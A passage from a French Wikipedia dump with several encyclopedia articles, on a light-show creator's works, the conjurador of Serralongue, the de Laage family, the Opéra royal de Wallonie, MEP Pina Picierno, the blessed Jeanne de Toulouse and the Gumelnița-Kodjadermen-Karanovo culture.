La version initiale salue les trois grands personnages qui ont marqué les Invalides (Louis XIV, fondateur des lieux, Napoléon, qui y repose, Charles de Gaulle, qui y installa l'Ordre de la Libération), une nouvelle version sur l'histoire de Paris est présentée en 2016, puis une nouvelle version pour le centenaire de la fin de la Première Guerre mondiale, et enfin une dernière version en 2021 et 2022 sur Napoléon, à l'occasion des 200 ans de sa mort. 
De 2018 à 2021, il crée "Les Chroniques du Mont", un parcours nocturne déambulatoire, proposé l'été dans l'abbaye du Mont Saint Michel.
En mai 2019, il crée le spectacle des 130 ans de la Tour Eiffel.
En 2019, à l'occasion du centenaire de la consécration de la basilique du Sacré-Coeur de Montmartre, il crée un parcours scénographique dans la crypte de la basilique.
En 2020, il crée le spectacle du tricentenaire du 1er régiment de hussards parachutistes de Tarbes.
En novembre 2020, il crée "Les Champs Élysées de la mer", un spectacle lumineux dans le chenal des Sables d'Olonne, à l'occasion de l'édition 2020 du Vendée Globe.
En 2021, 2022 et 2023, il crée "Les Étoiles de Fontevraud", un parcours nocturne déambulatoire, proposé l'été dans l'abbaye de Fontevraud.
En 2021, il réalise le film "Larzac, terres de chevaliers", projeté l'été dans la Commanderie de Sainte-Eulalie-de-Cernon en Aveyron.
En 2021 et 2022, il crée un parcours nocturne proposé l'été dans l'abbaye et les jardins de l'abbaye de Valloires.
En juillet 2022, il crée "L'Esprit cavalier", spectacle du 172 carrousel de Saumur.
En 2022, il crée "Éternelle Notre-Dame", la première visite virtuelle de la cathédrale Notre-Dame de Paris. 
En 2024, il crée "Raconte moi la France." La tournée du spectacle débute en octobre au zénith de Clermont-Ferrand"". André Dussollier prête sa voix à la narration du spectacle et la chanson finale est composée par Vianney .

</doc>
<doc id="7902375" url="https://fr.wikipedia.org/wiki?curid=7902375" title="Conjurador de Serralongue">
Conjurador de Serralongue

Le conjurador est un édifice de Serralongue, en France.
Caractéristiques.
Un conjurador est un petit édifice destiné à conjurer le mauvais sort, spécifiquement les mauvaises conditions climatiques pouvant entraîner la destruction des récoltes. Les conjuradors sont courants dans les anciens villages du Piémont pyrénéen et des Pyrénées, particulièrement en Aragon. À Serralongue, dans les Pyrénées-Orientales, le conjurador est édifié au sommet de la colline dominant le village, légèrement au nord-est.
Le conjurador de Serralongue est un édifice de plan carré, de de côté, surmonté d'un toit pyramidal recouvert de lauzes et terminé par une croix. Il est ouvert sur une de ses faces et pourvu de larges ouvertures en arcades sur les autres. Chaque ouverture est surmontée de la statue d'un Évangéliste, placée dans une niche.
Historique.
Le conjurador est bâti à la fin du . 
Lors des cérémonies, le prêtre de Serralongue y venait en procession pour réclamer l'intervention divine des Évangélistes. Le prêtre lisait alors l'évangile du saint faisant face à l'orage puis lançait une phrase en catalan : « "" », qui servait de conjuration.
L'édifice est inscrit au titre des monuments historiques le .
Annexes.
Liens externes.
Vue Intérieure https://goo.gl/maps/BzN6X3SJCqeTpuGz6

</doc>
<doc id="7902378" url="https://fr.wikipedia.org/wiki?curid=7902378" title="Famille de Laage">
Famille de Laage

La famille de Laage (aussi orthographiée "de Laâge") est une famille subsistante de la noblesse française.
Cette famille s'est illustrée dans l'administration des finances de l'État (conseiller-secrétaire du roi, receveur des tailles, fermier général). Cette famille compte aussi parmi ses membres des hommes d'Église, un député, des officiers.
Histoire.
La famille de Laage s'est scindée au en plusieurs branches :
Alliances.
Branche de Laâge de Bellefaye.
Depuis le : de Roffay (1709), de Guiscard (v.1730), de Heere de Beauworde (1758, 1816), de Villeneuve-Vence (1783), du Ruey (1784), de Lezay-Marnésia (1808), Chaptal de Chanteloup (1818), Kervyn de Lettenhove (1839), Levavasseur de Précourt (1845), de Laâge de Meux (1845), Poitelon du Tarde (1845), Lairtullier (1848), de Man d'Attenrode (1848, 1862), Fingerlin (1853), Mollard de Vilmarest (v.1865), de Penaranda (1870), Angiboust (1876), Gallois (1884), Le Sergeant de Monnecove (1887), de Bengy de Puyvallée (1890), de Chalus (1906), de Coëtlogon (1908), de Lencquesaing (1911), Taillandier (1914), de Proyart de Baillescourt (1920), Cannet de Roders (1924), Le Poitevin de La Croix-Vaubois (1924), Chareton (1933), Maës (1934), Bielman (1942), Le Mesre de Pas (1945), Roullet de La Bouillerie (1948), de Paix de Coeur de Roumare (1951), d'Avout (1951), Férault de Falandre(1954) de Mascureau (1954), de Tourtier (v.1965), Psaume (1975), Vezin (1979), Le Motheux du Plessis (1980), Hauguel (1980), Allard (1981), Douville de Franssu (1990), de Reviers de Mauny (1991), Vaillant de Guélis (1991), de Francqueville.
Branche de Laâge de Meux.
Robert de Rochecouste (1731), Cosson de Guimps (1740), Faure (1745), Tassin de Charsonville (1770), L'Huillier (1774), Pasquier de Lumeau (1777, 1851), Baguenault de Viéville (1791), Robillard (1797), Mingre de Noras (1801), Jaque de Mainville (1810), Prouvensal de Saint Hilaire (1811), Le Gardeur de Tilly (1829), de Gyvès de Creuzy (1832), Desprez de Montpezat (1832), Domet (1836), de Grémion (1838), de Laâge de Bellefaye (1845), de La Taille (1846, 1852), Bacot de Romand (1851), Lalande (1852), Vallet de Payraud (1856), Colas des Francs (1857), Louveau de La Règle (1858), Durand de Lavauxmartin (1859), Mesnaud de Saint Paul (1867), de Saluces (1869), de Seyssel (1872), Alefsen de Boisredon (1872), Desjobert (1874), Isle de Beauchaine (1875), de Lavau (1876), Pélissier (1879), de Cathelineau (1884), Guiot de La Rochère (1885), du Rousseau de Fayolle (1887), de Cugnac (1887), de Montardy (1888), de Guillebon (1888), Martin de Compreignac (1891), du Hamel du Fougeroux (1891, 1892), de Larminat (1892), de Vathaire (1894), Douville (1896), de Labriffe (1898), de Brix (1899), Le Père (1899), de Boissieu (1900), Mignon (1901), de Brandt (1905), van der Voort (1910), Vidal (1910), de Folin (1911), Gauly (1912), Ten Pol (1914), Beauchet-Filleau (1920), de La Chaise (1921), de Bellegarde (1922), de Watrigant (1924), Bès de Berc (1925), Demolon-Guignard de Saintours (1925), de Laparre de Saint-Sernin (1925), Pesme (1926), de Bouët du Portal (1926), d'Ornellas (1931), Hérissay (1933), Chauvelot (1935), de Gouvenain (1937), de Kuranda (1937), de Goussencourt (1939), d'Hespel de Flencques (1939), Deweppe (1939), Grassin-Delyle (1946), Magnier (1946), de Dreuille (1947), de Clauzade de Mazieux (1950), Tyrel de Poix (1950, 1976, 1982), d'Hespel de Flencques (1950), de Galard de Brassac de Béarn (1957), de Pressac de La Chèze (1958), Barennes (1963), Garnier de Labareyre (1963), de Francqueville (1965), de Charnières (1968), de Pommereau (1970, 1975), Arnoulx de Pirey (1971), Vouters (1974), Réglat (1976), Jauvin (1977), Brunet (1977), Lion (1977), Asselin de Williencourt (1977), Cadet (1982), Lecoq (1984), Himely (1986), Coste (1986), de Lapasse (1987), Etienne (1988), Blondel de Joigny (1989), Lafont de Sentenac (1992), Bardinet (1993), Hardy (1994), de Galbert (1994), du Pouget de Nadaillac (1994), de Roquefeuil (2011), van Parys (2016).
Branche de Laâge de Saint Germain.
Avant son extinction au milieu du : Huon de Rosne (1763), d'Aiguières (1774), de Chasseloup-Laubat (1776), Maurice de Sentout (1784), Landreau (1808), de Laverny (1816), de Laâge de Meux (1817), Bonnamy de Bellefontaine (1823), Charlet (1834), Cousin-Vallée (1843), Laforest (1844), Fontemoing (1852), Fetet (1854), Bruneau de Miré (1856), Desjuzeur (1865), Gout Desmartres (1867), de La Seiglière (1874), Beaurepaire (1894), Coulomb (1910)?
Branche de Laâge de La Rocheterie.
Depuis la fin du : Midou de Lisle (1785), Pasquier de Lumeau (1807), Mingre de Noras (1836), de Man d'Attenrode (1862), de Murat (1897), Lefèvre d'Ormesson (1901), de Saint Phalle (1919), de Langlois (1931), du Gaigneau de Champvallins (1931), Mc Kenzie (1953), Ngochie, Pernot, Krebs, Sarlin.
Armoiries.
Les armes de la famille se blasonnent ainsi "D'azur au chevron d'or, accompagné en chef de deux roses tigées et feuillées de même et en pointe d'une main fermée soutenant un faucon aussi d'or."
Hommages.
Saintes a deux rues rendant hommage à cette famille :
Maissin en Belgique a donné le nom de "Commandant de Laage de Meux" à l'une de ses avenues en souvenir de Joseph de Laage tombé glorieusement au combat en .
La commune d'Eppeville dans la Somme a donné le nom d'une rue nouvelle "rue du lieutenant Alfred de Laage de Meux le sur les lieux mêmes de la mort du pilote et commandant en second de l'escadrille Lafayette.

</doc>
<doc id="7902386" url="https://fr.wikipedia.org/wiki?curid=7902386" title="Opéra royal de Wallonie">
Opéra royal de Wallonie

L’Opéra royal de Wallonie, ou l’Opéra royal, est une maison d'opéra située place de l'Opéra, en plein centre de Liège en Belgique. Elle est, avec La Monnaie et le Vlaamse Opera, l’une des trois grandes maisons d’opéra du royaume. Depuis l’origine, l’institution occupe le Théâtre royal à Liège, bâtiment prêté par la ville (inauguré le ).
Sa situation géographique, au cœur de l’Euregio, au carrefour entre l’Allemagne, les Pays-Bas, le Grand-Duché de Luxembourg et la France, attire un large public tant belge qu'international.
Le terme Opéra national de Wallonie peut aussi désigner l'institution qui est domiciliée dans le bâtiment en question.
Histoire.
En 1816, le roi Guillaume d'Orange cède gracieusement à la ville de Liège le terrain et les matériaux de l'ancien couvent des dominicains, à condition d’y élever une salle de théâtre.
La première pierre est posée le par Mademoiselle Mars. Construit selon le plan de l'architecte Auguste Dukers, le théâtre de style néoclassique est de forme parallélépipédique massive. Sa façade principale est décorée d'une colonnade de marbre, limitée par une balustrade et surmontant les arcades du rez-de-chaussée.
Le théâtre royal de Liège est inauguré le .
La ville en devient propriétaire en 1854. La statue située devant le bâtiment représente le compositeur liégeois André Grétry et est l'œuvre du sculpteur Guillaume Geefs. Le cœur du musicien a été déposé dans le socle de la statue en 1842. En 1861, l'architecte Julien-Étienne Rémont transforme profondément la salle et le bâtiment qui est allongé de plusieurs mètres à l'arrière et sur les côtés. La nouvelle salle, de style Second Empire, peut alors accueillir plus de .
La Première Guerre mondiale sera une période difficile : dès , le bâtiment est réquisitionné par l'armée allemande pour servir d'écurie et de dortoir, et il faudra attendre pour sa réouverture. L'Exposition internationale de Liège, en 1930, est l'occasion de l'installation définitive d'un vaste fronton, sculpté en façade par Oscar Berchmans – décor de figures allégoriques. La même année, la ville procède au dérochage des façades qui perdent leur enduit blanc. L'édifice sera épargné lors de la Seconde Guerre mondiale. Il accueillera du public à cette période également, entre autres un « Gala de la Chanson » en juillet 1942 avec à l'affiche Charles Trénet et Claude Lagrange mais aussi Elyane Narcy, Charles Dumont &amp; Georgette Maes, Léon Dubressy et Marie Reyland.
C’est en 1967 que la troupe de l'Opéra royal de Wallonie est créée, sur la base de l’ancienne troupe lyrique du théâtre royal de Liège et de celle de Verviers. Il est constitué en association sans but lucratif regroupant, au début, les villes de Liège et de Verviers. Le Ministère de l'Éducation nationale et de la Culture française de l'époque est impliqué financièrement peu de temps après. Lors de la communautarisation, l’Opéra royal de Wallonie passe dans le giron de la Communauté française de Belgique qui compense, dès 1990, l'impécuniosité de la ville, et en est, depuis, le principal bailleur de fonds. , la Ville, la Région wallonne et la Province de Liège reprennent part progressivement à son financement.
Le bâtiment est classé comme monument par la Wallonie par arrêté du .
Rénovation.
L’édifice subit une importante rénovation de à , tant extérieure qu’intérieure. Les parties historiques ont été restaurées à l'identique (grand foyer, escaliers d'honneur et salle). Sa salle de spectacle (capacité ), à l’italienne et sa machinerie de scène en font un des théâtres les plus modernes au monde.
Le bâtiment se voit aussi agrandi. À l'instar de la rénovation de l'Opéra de Lyon par Jean Nouvel une quinzaine d'années plus tôt, une structure ultramoderne a été installée en hauteur dans le but d'augmenter la hauteur de la cage de scène, et est dotée d'une salle dite polyvalente (salle Raymond Rossius) pouvant accueillir tant des spectacles de plus petite forme, que des répétitions ou encore des colloques, des conférences, des stages…
Dès et jusqu'à la fin des travaux, les représentations se donnèrent au « Palais Opéra » : un chapiteau dressé de manière provisoire sur l'espace Bavière.
L'Opéra royal de Wallonie rénové est inauguré le , avec une représentation de l'opéra "Stradella" (1841) de César Franck, monté ici pour la première fois, dans une mise en scène de Jaco Van Dormael, en présence du couple héritier de Belgique, Philippe et Mathilde.
Structure.
Gestion.
En 2006, la subvention de la Communauté française à l'Opéra est de , dont près des deux tiers passent en salaires, puisqu'il emploie plus de trois cents personnes.
La capacité de la salle est de .
La troupe de l’Opéra royal de Wallonie a eu pour directeurs successifs :
De 2007 à sa mort le 7 février 2021, Stefano Mazzonis di Pralafera a été le directeur général et artistique. C’est lui qui a nommé le directeur musical actuel, Speranza Scappucci.
Au fil des années, l'Opéra royal de Wallonie a acquis une solide renommée. Ruggero Raimondi, Juan Diego Florez, Deborah Voigt, José Cura, José van Dam, autant de grands artistes que l'on retrouve, régulièrement, à l'affiche. Mais la vocation de l'Opéra est aussi de faire découvrir des artistes locaux et/ou en devenir.
L'Opéra royal de Wallonie est membre de RESEO (Réseau européen pour la sensibilisation à l'opéra et à la danse) et d'Opera Europa.
Orchestre et Chœurs de l'Opéra royal de Wallonie.
L’orchestre et les chœurs s'illustrent dans de nombreux répertoires. Ils se produisent d'ailleurs à l’étranger, comme au Festival international de Balbeeck ou encore au Festival de Santander.
Ballet de l'Opéra royal de Wallonie.
Fondé en même temps que la troupe d'opéra, le ballet de l'Opéra royal de Wallonie voit le jour en 1967. Interprétant essentiellement les divertissements dans le répertoire lyrique classique, le ballet s'oriente progressivement vers plus d'autonomie et vers un style néoclassique. Des restrictions budgétaires drastiques obligent le conseil d'administration à dissoudre le ballet en 1997.
Le ballet a eu comme chorégraphes notamment André Leclair, Gigi Caciuleanu et Jacques Dombrowski. Parmi les danseuses étoiles, on peut citer Ambra Vallo, aujourd'hui "Principal" au Royal Ballet.
Ateliers.
Depuis sa création en 1967, une des grandes forces de l'Opéra royal de Wallonie est la particularité de vouloir fonctionner en entité indépendante. C'est pourquoi, les années 1970 voient ainsi la maison se doter de ses propres ateliers de confection de décors et costumes. Les bâtiments qui abritent les différents corps de métiers sont, à cette époque, répartis à divers endroits de la ville.
C’est au cours de la saison 1996/97, lors de la réalisation des décors colossaux et des costumes de "La Traviata" que de nouveaux besoins se font sentir. Si les ateliers veulent rester à la hauteur de leur réputation, il faut trouver au plus vite une solution au manque de place et de fonctionnalité des locaux existants.
C’est ainsi que l’Opéra royal de Wallonie décide de centraliser ses départements de production en un seul site, à Ans, en . Ce nouvel ensemble architectural s'étend sur et groupe alors en un seul lieu les ateliers : décors (menuiserie, ferronnerie, peinture et accessoires), costumes (couture, chaussure, décoration de costumes) et maquillage-perruquerie.
Studio Marcel Désiron.
Jusqu'en 2003, l'orchestre répétait dans la sous-salle du Théâtre royal, un local inconfortable et exigu.
En 2002, le transfert des ateliers de fabrications de décors vers leurs nouvelles installations à Ans a libéré les bâtiments de la rue des Tawes à Liège. L’ancien hall de montage des décors présentait un espace idéal par son volume et par sa dissymétrie (murs non parallèles, toiture à pans multiples) caractéristique intéressante du point de vue acoustique.
Une étude acoustique fut commandée et démontra la faisabilité du projet. Après une répétition de l’orchestre organisée afin de « tester » le hall, l'Opéra royal de Wallonie décida d’y aménager une salle de répétition de , d’une hauteur de . L’objectif était de réaliser les travaux afin que les musiciens puissent y répéter dès 2003.
C'est ainsi que depuis la saison 2003-2004, toutes les répétitions d’orchestre se déroulent dans cet espace pouvant accueillir près de cent vingt musiciens. Si ce lieu est prioritairement réservé à la musique, il peut être aussi transformé en studio de mise en scène, si nécessaire.
Foyer de l'Opéra.
Depuis le début de la saison 2013-2014, le foyer Grétry accueille le "Foyer de l’Opéra", un restaurant avant chaque représentation.

</doc>
<doc id="7902389" url="https://fr.wikipedia.org/wiki?curid=7902389" title="Pina Picierno">
Pina Picierno

Giuseppina « Pina » Picierno, née le à Santa Maria Capua Vetere en Campanie, est une personnalité politique italienne, membre du Parti démocrate.
Biographie.
Giuseppina Picierno est née le à Santa Maria Capua Vetere, au sein d'une une famille originaire de San Marco, un hameau de la commune de Teano, fille de Pasquale Picierno, ingénieur à Sessa Aurunca et secrétaire municipal de La Marguerite, lui-même frère de Raffaele Achille Picierno (1949), membre de la Démocratie chrétienne puis du Parti démocrate (PD), conseiller municipal, adjoint au maire et maire de Teano. 
Diplômée du lycée linguistique Leonardo da Vinci de Vairano Scalo, elle étudie à l'université de Salerne où elle obtient une licence en sciences de la communication, avec un mémoire sur les différences de communication entre Ciriaco De Mita et Bettino Craxi 
Elle est élue députée à la Chambre en 2008 et réélue en 2013. 
Pour les élections européennes de 2014, Pina Picierno est retenue comme tête de liste de son parti, Parti démocrate, pour l'Italie méridionale.Elle est élue députée européenne d'Italie de la le 25 mai 2014. Lors des élections européennes de 2019 puis les élections européennes de 2024, elle se présente à nouveau au Parlement européen, sur les listes du Parti démocrate, et est réélue députée européenne.
Elle devient vice-présidente du Parlement européen. Elle se montre solidaire, dans ses prises de position au parlement européen, de l'Ukraine, agressée par la Russie. Début mars 2025, Vladimir Soloviev, animateur star de la chaîne Rossiya 1, la télévision d'État russe, est invité à participer à une émission en Italie, sur Rai 3. Pina Picierno s’offusque publiquement de ce créneau accordé à « l’un des principaux propagandistes du Kremlin », cible depuis 2022 de sanctions de l’Union européenne. « Le service public italien ne peut être en aucune manière le mégaphone de la désinformation russe », explique-t-elle haut et fort. Vladimir Soloviev est décommandé et se répand en injures sur Pina Picierno. « Sa bouche pue la tyrannie » affirme-t-il, ou encore, il la qualifie de « sale bête, honte de la race humaine ». Pina Picierno se trouve également harcelée et menacée de mort sur les réseaux sociaux par des trols.

</doc>
<doc id="7902396" url="https://fr.wikipedia.org/wiki?curid=7902396" title="Jeanne de Toulouse (carmélite)">
Jeanne de Toulouse (carmélite)

Jeanne de Toulouse est une bienheureuse catholique Si les éléments de sa biographie sont sujets à caution, il semble qu'elle ait vécu entre le et le , à Toulouse, dans le royaume de France. Elle est liée à l'histoire du couvent des Carmes de la ville. Elle est béatifiée en 1895 par le pape Léon XIII et ses reliques sont vénérées dans la cathédrale de Toulouse.
Biographie.
Incertitudes historiques et traditions.
Peu d'éléments biographiques sont connus de façon certaine sur Jeanne de Toulouse. Sa date de naissance semble inconnue, et celle de son décès varie d'une source à l'autre, quand ce n'est pas une confusion avec les dates de la comtesse Jeanne de Toulouse. Qui plus est, en cette période du dans la région plusieurs femmes ont pris ce même nom de "Jeanne de Toulouse".
Une tradition indique qu'à la suite de la fondation d'un monastère de Carmes à Toulouse en 1240, Jeanne découvre la spiritualité carmélitaine. Simon Stock, de passage dans la ville en 1265, la rencontre et accepte sa demande de suivre la règle du Carmel, et elle devient ainsi la première carmélite du Tiers-Ordre.
Jeanne, restant vierge, s'applique alors à suivre toutes les exigences de la règle. Elle vient en aide à la communauté des Carmes de la ville et assiste les malades et les pauvres. Elle encourage également les laïcs toulousains à en faire de même.
Une autre source fait d'elle la fille de Baudouin de Toulouse (et d'Alix de Lautrec). Son père ayant été assassiné par son frère, le comte Raymond VI, Jeanne, en réparation du crime, se serait fait cloitrée dans une petite maison attenante à la cathédrale Saint-Étienne. Par une petite fenêtre elle avait une vue sur l'autel et adorait le Saint-Sacrement jour et nuit. Elle y aurait vécu recluse jusqu'à sa mort.
Origine probable.
Selon la source biographie la plus fiable, rédigée par le carme Jean Bale, qui visita Toulouse en 1527, Jeanne était issue d'une famille noble du royaume de Navarre.
Ayant une grande dévotion pour la Vierge Marie, Jeanne décide de vivre comme recluse près du couvent des Carmes de Toulouse. Elle vit alors de dévotion, d'austérité et de prières, en communion avec ses proches : « Elle aimait parler de sujets spirituels avec les jeunes frères carmes et priait beaucoup pour eux, ce qui leur apportait un grand profit spirituel ».
Jeanne de Toulouse n'apparait pas dans la liste des saints de l'Ordre publiée par Jean Grossi († 1437) qui était membre de la province carmélitaine de Toulouse. C'est pourquoi, compte tenu des autres éléments bibliographiques connus, Jeanne semble avoir vécu au début du , au mieux peu de temps avant (un autre site du carmel propose comme date de décès vers 1380).
L'initiatrice du carmel féminin et du Tiers-Ordre.
Dans les différents écrits traitant de Jeanne de Toulouse, elle est qualifiée de "tertiaire", et parfois de "Carmélite". Bien que ces deux branches de l'ordre du Carmel n'aient pas encore été officiellement fondées à cette période, il n'est pas exclu que Jeanne ait fait profession de la règle carmélitaine, comme le faisaient parfois certaines femmes à cette période .
Jeanne de Toulouse est donc connue, dans la tradition carmélitaine, pour avoir eu une vie de recluse, s'inspirant de la spiritualité carmélitaine, avant l'ouverture de l'ordre aux femmes et aux laïcs. Elle a ainsi parfois été considérée (dans une tradition carmélitaine) comme étant la première carmélite (voir l'initiatrice de cette branche), mais parfois également, comme la fondatrice du Tiers-Ordre carmélite.
Béatification et culte.
Les reliques.
Bernard Yvest de Roserge († 1474), évêque de Toulouse, fait exhumer ses reliques et les place dans une urne, déposée dans la chapelle du couvent des Carmes de la ville. À la suite de la procédure de demande de béatification, en 1656, un couvent espagnol demande à disposer de certaines reliques de la bienheureuse. Le prieur général de l'ordre, Henry Silvio, profite d'un déplacement en Espagne, pour leur porter le bras et la main droite de la sainte. Des écrits datés de 1688 signaleront qu'à cette date, la main gauche et quelques dents sont également manquantes dans l'ossuaire toulousain.
Après la Révolution française, en 1805, le couvent et l'église des Carmes sont détruits. Des reliques de la bienheureuse sont alors découvertes dans le mur de l'église, ainsi que des documents placés là en 1688 (documents placés à l'occasion de l'examen des reliques effectué à la suite du processus de béatification). Les reliques sont alors transférées dans la cathédrale Saint-Étienne de Toulouse, et placées dans la chapelle Saint-Vincent-de-Paul. En 1893, à l'occasion de sa prochaine béatification, les reliques sont à nouveau exhumées et placées dans un reliquaire.
La béatification.
La demande de béatification de Jeanne de Toulouse est faite lors du chapitre général de l'ordre du Carmel à Naples en 1510.
L'examen est ouvert en 1616, puis relancé en 1656 et 1688.
Jeanne de Toulouse est béatifiée par le pape Léon XIII en 1895.
Le culte de la bienheureuse.
Après son décès, plusieurs miracles lui sont attribués par ses contemporains. Son culte est officiellement autorisé au milieu du par l'évêque Bernard du Rosier.
Sa fête est célébrée le 31 mars. Considérée comme sainte et célébrée dans l'ordre du Carmel avant sa béatification, la dernière réforme liturgique a retiré sa fête du "calendrier des saints de l'ordre du carmel" (liste des fêtes devant être obligatoirement célébrées dans l'ordre). À sa mémoire, on peut y associer Anne de Toulouse, sans doute sa sœur, elle aussi religieuse cloitrée, liée au Carmel et ayant vécu comme recluse à la même période que Jeanne.
Iconographie.
La plus ancienne représentation iconographie de Jeanne de Toulouse date de 1472, elle est située dans l'église Saint-Félix de Benaco (Brescia). La bienheureuse est vêtue du manteau blanc des tertiaires de l'ordre. En 1620, le prieur du couvent d'Anvers, Gaspard Rinkens, commanda une peinture de la bienheureuse. Le peintre la représente habillée en carmélite, regardant le crucifix qu'elle tient dans sa main. La bienheureuse fut, par la suite, et jusqu'à aujourd'hui, toujours représentée de cette façon dans l'iconographie religieuse.

</doc>
<doc id="7902403" url="https://fr.wikipedia.org/wiki?curid=7902403" title="Culture de Gumelnița-Kodjadermen-Karanovo">
Culture de Gumelnița-Kodjadermen-Karanovo

La culture de Gumelnița-Kodjadermen-Karanovo est une culture archéologique chalcolithique du du nord-est des Balkans. Elle se caractérise par un développement remarquable de la métallurgie et par une importante hiérarchisation de la société. La culture a été découverte et définie par Henrieta Todorova.
Chronologie et aire d'extension.
Elle est précédée par la culture de Hamangia et suivie par celle de Cernavodă.
Les datations radiocarbones permettent de la situer au 
Cette culture s'est développée dans le bassin du bas-Danube dans ce qui est aujourd'hui la Roumanie méridionale (Valachie, Dobrogée), le Boudjak ukrainien, la Bulgarie et le nord de la Grèce jusqu'à la mer Égée, avec par exemple le site de Sitagroi.
Mode de vie.
La population était majoritairement composée d'agriculteurs-éleveurs pratiquant la culture de céréales et de légumineuses et l'élevage de bovins, de chèvres, de moutons et de porcs. 
Cependant, la chasse était encore largement pratiquée mais pas nécessairement pour des raisons alimentaires. Les animaux sauvages étaient en effet exploités pour partie pour leurs peaux et leurs ossements étaient utilisés dans différentes activités artisanales. Ils étaient sans doute chassés au moins pour partie pour des raisons sociales et/ou rituelles, à l'image de l'aurochs dont le rôle symbolique semble avoir été important dans cette société. 
Les activités artisanales étaient particulièrement développées, notamment la métallurgie, le travail du silex ou la réalisation de poteries. 
D'autres matériaux étaient exploités à une large échelle, c'est notamment le cas du sel minéral dont le site de Provadija-Solnicata témoigne d'une exploitation de grande ampleur.
Occupation du territoire et habitat.
Les villages regroupaient quelques centaines d'habitants au maximum. Leur implantation semble avant tout répondre à la proximité des ressources naturelles (eau, terres agricoles, etc.) et aucun élément ne suggère une volonté de privilégier des lieux naturellement fortifié ou des lieux stratégiques. Toutefois, les habitats sont souvent entourés d'un fossé et d'une palissade.
Quelle que soit la région considérée, la structure des villages ne répond à aucun plan préétabli bien que des ruelles séparent les différentes structures. Les maisons de plan rectangulaire sont de dimensions relativement homogènes malgré quelques variations, aucune structure ne se distingue par des dimensions ou un plan inhabituel.
Ces maisons sont réalisées en torchis et leur structure est constituée de poteaux de bois. Le nombre de pièces est variable, certaines présentent un étage, d'autres se caractérisent par des peintures murales.
Dans certains villages, des structures particulières ont été découvertes : il s'agit d'ateliers liés à des productions artisanales.
Productions matérielles.
Céramique.
Les poteries sont de grande qualité et témoignent de la maîtrise de la cuisson à haute température. Leur forme, leurs décors et leurs techniques de réalisation présentent à la fois des points communs mais aussi des différences notables sur toute la région.
Toutefois, à l'échelle de toute la culture, on retrouve des céramiques dites "graphitées", c'est-à-dire des poteries dont la surface qui a été travaillée pour la rendre noire et brillante présente l'aspect du graphite.
Les décors présents sur certains vases sont caractérisés par des formes géométriques (des damiers notamment) et des spirales. Il existe également des décors plastiques sous la forme de protubérances parfois de grandes dimensions.
Outillage en roche taillée.
Dans toutes les régions, l'outillage est avant tout réalisé sur les matières premières locales. 
On trouve également des lames très régulières en silex de la Dobroudja réalisées par pression debout et au levier. Elles constituent une part marginale, parfois exceptionnelle, de l'outillage.
Il n'y a quasiment aucun élément en obsidienne qui parvient dans cette région à cette époque, à l'exception notable d'une petite lame découverte dans la tombe la plus riche de la nécropole de Varna.
Des lames et des éclats sont utilisés sous la forme de grattoirs et de faucilles. Ces dernières sont constituées de fragments de lames de silex insérées obliquement dans un manche en bois ou en os. Quelques grosses pointes bifaciales très soigneusement réalisées sont également présentes dans certains sites.
Outillage en os et bois de cervidé.
Les outils en os et en bois de cervidé sont fréquents et souvent de très bonne qualité.
Objets en pierre.
Les haches polies réalisées dans différents matériaux sont relativement fréquentes.
Des analyses ont montré que certaines des haches des sépultures de Varna et les haches du dépôt non funéraire de Svoboda étaient en jadéite provenant du sud-ouest des Alpes.
Elles ont donc circulé sur des centaines de kilomètres pour parvenir jusqu'en Bulgarie.
La pierre était également utilisée pour la réalisation de récipients, on trouve par exemple des petits plats en marbre.
Métallurgie.
La culture de Gumelnița-Kodjadermen-Karanovo se caractérise par un développement exceptionnel de la métallurgie. Les artisans étaient en mesure de faire fondre le cuivre et de réaliser de gros objets, comme les haches. On retrouve ces dernières dans les sépultures, notamment dans les tombes les plus riches de la nécropole de Varna.
Dans le même temps, les gros objets en cuivre sont particulièrement rares dans les régions voisines, notamment en Grèce.
Outre le cuivre, cette culture se caractérise par les plus anciens objets en or d'Europe. Il s'agit exclusivement d'éléments de parure et d'apparat, par exemple des plaquettes, des boucles, des bracelets et même des petites plaques recouvrant un sceptre dans une des tombes de Varna.
Figurines, tampons et éléments de parure.
Des figurines en os de bovin domestique sont présentes dans les habitats ; elles représentent des femmes dont les bras sont à peine marqués. Des figurines équivalentes sont présentes dans certaines sépultures, mais elles sont réalisées en os d'aurochs.
Des ateliers spécialisés dans leur réalisation sont connus dans certains sites, par exemple à Hotnica.
Des figurines sont également réalisées en terre-cuite. Leur morphologie est très variée.
La parure en coquillage est relativement fréquente. Au moins une partie des coquillages utilisés proviennent des régions égéennes, par exemple les spondyles et les dentales.
Pratiques funéraires et rituelles.
Les pratiques funéraires sont très mal connues en dehors de quelques cimetières concentrés dans le nord-est de la Bulgarie et le sud-est de la Roumanie.
L'absence des défunts malgré l'importance des recherches archéologiques suggèrent que les pratiques funéraires de l'époque conduisaient presque systématiquement à la disparition totale des dépouilles.
Les cimetières sont une exception remarquable ; celui de Varna a livré près de 300 tombes, la plupart avec pas ou peu de mobilier mais quelques-unes avec une très grande variété et une très grande richesse des objets déposés (objets en or, en cuivre, en jadéite, en silex, figurines, poteries...).
On compte aussi de nombreux cénotaphes dans ce site.
Organisation sociale.
La découverte du cimetière de Varna en 1972 a permis de montrer que la société était très hiérarchisée au moins dans certaines régions. Quelques individus étaient en mesure de concentrer des richesses très variées, notamment des objets en or et en cuivre. La présence d'un sceptre-hache dans la tombe la plus riche suggère que l'individu inhumé était un chef important.
La fréquence des cénotaphes dans ce même cimetière, et la proximité de la mer ont conduit certains chercheurs à émettre l'hypothèse que les défunts étaient morts loin de chez eux et que leur corps n'avaient pas pu être récupéré.
Toutefois, l'organisation sociale globale de la société reste encore mal comprise. Les tombes très riches sont limitées au seul cimetière de Varna, même si des tombes riches sont présentes dans d'autres cimetières de la même région. Dans l'habitat, il n'y a pas la moindre trace de maisons pouvant être interprétées comme celles de chefs.
D'autre part, en dehors de la zone côtière au nord de la Bulgarie et au sud de la Roumanie, il n'y a pas d'indice de hiérarchisation puisque les pratiques funéraires n'ont laissées aucune trace. Le seul argument suggérant une hiérarchisation importante de la société sur l'ensemble du territoire est le développement important des différentes activités artisanales dans toutes les régions pour des productions dont la diffusion était très probablement inégale au sein de la population (par exemple gros outils en cuivre, très longues lames de silex, etc.).
Relations avec les régions voisines.
La culture de Gumelnița-Kodjadermen-Karanovo est assez repliée sur elle-même. La quasi-totalité de la culture matérielle, y compris les productions artisanales les plus spectaculaires sont réalisées dans des matériaux des régions occupées par cette culture (cuivre, or) ou des régions immédiatement voisines (coquillages de l’Égée, cuivre de Serbie). 
